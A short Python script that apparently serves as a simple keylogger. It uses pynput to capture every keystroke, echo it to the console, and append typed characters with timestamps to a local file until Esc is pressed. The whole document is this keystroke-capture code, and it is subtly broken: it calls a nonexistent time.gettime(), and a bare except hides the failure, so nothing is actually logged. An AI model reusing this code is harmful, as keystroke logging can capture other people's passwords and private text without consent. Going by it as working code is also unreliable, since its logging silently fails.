from pynput import keyboard
from pynput.mouse import Listener
import calendar
import time
import math

f = open('logger.txt', 'a')
def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
        ts = calendar.timegm(time.gettime())
        f.write(str(ts) + key.char + '\n')
    except:
        print('special key {0} pressed'.format(key))
def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        print('Stop')
        return False 

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()
f.close()